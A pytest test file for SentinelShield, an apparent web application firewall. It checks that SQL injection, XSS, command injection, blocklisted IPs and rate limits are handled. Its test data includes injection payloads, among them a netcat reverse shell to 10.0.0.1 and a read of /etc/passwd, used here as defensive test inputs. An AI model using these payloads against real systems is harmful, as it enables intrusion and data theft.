import tempfile
from pathlib import Path
from unittest.mock import Mock, MagicMock

import yaml
import pytest

from sentinel_shield.core.engine import SentinelShield
from sentinel_shield.core.config import Config


@pytest.fixture
def rules_dir():
    with tempfile.TemporaryDirectory() as tmpdir:
        rules = [{
            "attack_type": "sqli",
            "rules": [{
                "id": "SQLI-TEST",
                "name": "Test SQLi Rule",
                "severity": "critical",
                "severity_weight": 1.0,
                "confidence": 0.95,
                "locations": ["query", "body"],
                "patterns": [
                    r"UNION\s+SELECT",
                    r"'\s*OR\s+1=1",
                    r"--\s*$",
                ],
                "action": "block",
            }],
        }]
        rdir = Path(tmpdir) / "rules"
        rdir.mkdir()
        with open(rdir / "test_sqli.yml", "w") as f:
            yaml.dump(rules[0], f)
        yield rdir


@pytest.fixture
def config(rules_dir):
    data = {
        "server": {"host": "0.0.0.0", "port": 8080},
        "detection": {"mode": "block"},
        "rate_limiter": {"enabled": False, "requests_per_minute": 60, "burst_size": 10},
        "ip_reputation": {"enabled": False, "blocklist": [], "allowlist": ["127.0.0.1", "::1"]},
        "logging": {"level": "CRITICAL", "format": "json", "output": "stdout"},
        "traffic_analyzer": {"enabled": False, "window_seconds": 300},
    }
    cfg = Mock(spec=Config)
    cfg.server = data["server"]
    cfg.detection = data["detection"]
    cfg.rate_limiter = data["rate_limiter"]
    cfg.ip_reputation = data["ip_reputation"]
    cfg.logging = data["logging"]
    cfg.traffic_analyzer = data["traffic_analyzer"]
    cfg.rules_dir = rules_dir
    cfg._data = data
    return cfg


def make_env(method="GET", path="/", query="", body="",
             content_type="", remote="127.0.0.1"):
    body_bytes = body.encode()
    wsgi_input = MagicMock()
    wsgi_input.read = Mock(return_value=body_bytes)
    return {
        "REQUEST_METHOD": method,
        "PATH_INFO": path,
        "QUERY_STRING": query,
        "RAW_URI": f"{path}?{query}" if query else path,
        "REMOTE_ADDR": remote,
        "CONTENT_TYPE": content_type,
        "CONTENT_LENGTH": str(len(body_bytes)),
        "wsgi.input": wsgi_input,
        "SERVER_NAME": "test",
        "SERVER_PORT": "80",
    }


def wsgi_app_success(environ, start_response):
    headers = [("Content-Type", "text/plain")]
    start_response("200 OK", headers)
    return [b"OK"]


def test_clean_request_passes(config):
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(query="page=1&search=hello")
    start = Mock()

    waf(env, start)

    assert app.called
    assert start.called
    status_line = start.call_args[0][0]
    assert "200" in status_line


def test_sqli_blocked(config):
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(query="id=1'+OR+1=1--")
    start = Mock()

    waf(env, start)

    assert not app.called
    assert start.called
    status_line = start.call_args[0][0]
    assert "403" in status_line


def test_sqli_in_body(config):
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(
        method="POST",
        body="username=admin' OR 1=1--",
        content_type="application/x-www-form-urlencoded",
    )
    start = Mock()

    waf(env, start)

    assert not app.called
    assert start.called
    status_line = start.call_args[0][0]
    assert "403" in status_line


def test_blocked_ip(config):
    config.ip_reputation = {
        "enabled": True,
        "blocklist": ["10.0.0.1"],
        "allowlist": [],
    }
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(remote="10.0.0.1")
    start = Mock()

    waf(env, start)

    assert not app.called
    assert start.called
    status_line = start.call_args[0][0]
    assert "403" in status_line


def test_rate_limit_exceeded(config):
    config.rate_limiter = {
        "enabled": True,
        "requests_per_minute": 60,
        "burst_size": 1,
    }
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)

    env = make_env()
    start = Mock()

    waf(env, start)
    assert app.called

    app.reset_mock()
    start.reset_mock()

    waf(env, start)
    assert not app.called
    assert start.called
    status_line = start.call_args[0][0]
    assert "429" in status_line


def test_log_mode_does_not_block(config):
    config.detection = {"mode": "log"}
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(query="id=1'+OR+1=1--")
    start = Mock()

    waf(env, start)

    assert app.called


def test_allowlist_bypass(config):
    config.ip_reputation = {
        "enabled": True,
        "blocklist": ["10.0.0.1"],
        "allowlist": ["10.0.0.1"],
    }
    app = Mock(wraps=wsgi_app_success)
    waf = SentinelShield(app, config)
    env = make_env(remote="10.0.0.1")
    start = Mock()

    waf(env, start)

    assert app.called


def test_union_select_detected(config):
    waf = SentinelShield(Mock(wraps=wsgi_app_success), config)
    matches = waf.rules_engine.evaluate({
        "query": "id=1 UNION SELECT * FROM users",
        "body": "",
        "headers": {},
        "cookies": "",
        "path": "/",
        "uri": "/",
    })
    assert len(matches) > 0
    assert matches[0]["attack_type"] == "sqli"


def test_clean_request_no_matches(config):
    waf = SentinelShield(Mock(wraps=wsgi_app_success), config)
    matches = waf.rules_engine.evaluate({
        "query": "page=2&category=books",
        "body": "",
        "headers": {},
        "cookies": "",
        "path": "/",
        "uri": "/",
    })
    assert len(matches) == 0


def test_xss_detected(config):
    from sentinel_shield.detection.rules_engine import RulesEngine
    eng = RulesEngine(config.rules_dir)
    matches = eng.evaluate({
        "query": "<script>alert(1)</script>",
        "body": "",
        "headers": {},
        "cookies": "",
        "path": "/",
        "uri": "/",
    })
    sqli_matches = []
    for m in matches:
        if m["attack_type"] == "sqli":
            sqli_matches.append(m)
    assert len(sqli_matches) == 0


def test_multiple_rules_loaded(config):
    waf = SentinelShield(Mock(wraps=wsgi_app_success), config)
    assert len(waf.rules_engine.rules) >= 1


def test_xss_blocked_with_full_rules():
    with tempfile.TemporaryDirectory() as tmpdir:
        rdir = Path(tmpdir) / "rules"
        rdir.mkdir()
        xss_rule = {
            "attack_type": "xss",
            "rules": [{
                "id": "XSS-TEST",
                "name": "Test XSS Rule",
                "severity": "critical",
                "severity_weight": 1.0,
                "confidence": 0.95,
                "locations": ["query"],
                "patterns": ["<script[^>]*>"],
                "action": "block",
            }],
        }
        with open(rdir / "test_xss.yml", "w") as f:
            yaml.dump(xss_rule, f)

        cfg_data = {
            "server": {"host": "0.0.0.0", "port": 8080},
            "detection": {"mode": "block"},
            "rate_limiter": {"enabled": False},
            "ip_reputation": {"enabled": False},
            "logging": {"level": "CRITICAL"},
            "traffic_analyzer": {"enabled": False},
        }
        cfg = Mock(spec=Config)
        for k, v in cfg_data.items():
            setattr(cfg, k, v)
        cfg.rules_dir = rdir
        cfg._data = cfg_data

        app = Mock(wraps=wsgi_app_success)
        waf = SentinelShield(app, cfg)
        env = make_env(query="q=<script>alert(1)</script>")
        start = Mock()

        waf(env, start)
        assert not app.called
        assert start.called
        status_line = start.call_args[0][0]
        assert "403" in status_line


def _real_rules_engine():
    from sentinel_shield import __file__ as pkg_file
    from sentinel_shield.detection.rules_engine import RulesEngine
    rules_dir = Path(pkg_file).parent / "detection" / "rules"
    return RulesEngine(rules_dir)


def test_command_injection_detected():
    engine = _real_rules_engine()
    payloads = [
        "cmd=1;whoami",
        "cmd=ls -la",
        "cmd=1&&cat /etc/passwd",
        "cmd=1|nc -e /bin/sh 10.0.0.1 4444",
        "cmd=$(whoami)",
        "cmd=`id`",
        "cmd=${IFS}id",
        "cmd=sh -c whoami",
        "cmd=1%0a/usr/bin/id",
        "cmd=powershell -c whoami",
    ]
    for q in payloads:
        matches = engine.evaluate({
            "query": q, "body": "", "headers": {}, "cookies": "",
            "path": "/", "uri": "/",
        })
        cmd = []
        for m in matches:
            if m["attack_type"] == "command_injection":
                cmd.append(m)
        assert len(cmd) > 0, f"expected command_injection match for {q}"


def test_clean_request_has_no_command_injection_match():
    engine = _real_rules_engine()
    for q in ["page=1&search=hello", "page=2&category=books", "file=notes.txt"]:
        matches = engine.evaluate({
            "query": q, "body": "", "headers": {}, "cookies": "",
            "path": "/", "uri": "/",
        })
        cmd = []
        for m in matches:
            if m["attack_type"] == "command_injection":
                cmd.append(m)
        assert len(cmd) == 0, f"false command_injection match for {q}"


def test_command_injection_blocked():
    with tempfile.TemporaryDirectory() as tmpdir:
        rdir = Path(tmpdir) / "rules"
        rdir.mkdir()
        rule = {
            "attack_type": "command_injection",
            "rules": [{
                "id": "CMD-TEST",
                "name": "Test Command Injection Rule",
                "severity": "critical",
                "severity_weight": 1.0,
                "confidence": 0.95,
                "locations": ["query"],
                "patterns": [r"^cmd=.*(whoami|cat|ls)"],
                "action": "block",
            }],
        }
        with open(rdir / "test_cmd.yml", "w") as f:
            yaml.dump(rule, f)

        cfg = Mock(spec=Config)
        cfg.server = {"host": "0.0.0.0", "port": 8080}
        cfg.detection = {"mode": "block"}
        cfg.rate_limiter = {"enabled": False}
        cfg.ip_reputation = {"enabled": False}
        cfg.logging = {"level": "CRITICAL", "format": "json", "output": "stdout"}
        cfg.traffic_analyzer = {"enabled": False}
        cfg.rules_dir = rdir
        cfg._data = {}

        app = Mock(wraps=wsgi_app_success)
        waf = SentinelShield(app, cfg)
        env = make_env(query="cmd=1;whoami")
        start = Mock()

        waf(env, start)
        assert not app.called
        assert start.called
        status_line = start.call_args[0][0]
        assert "403" in status_line
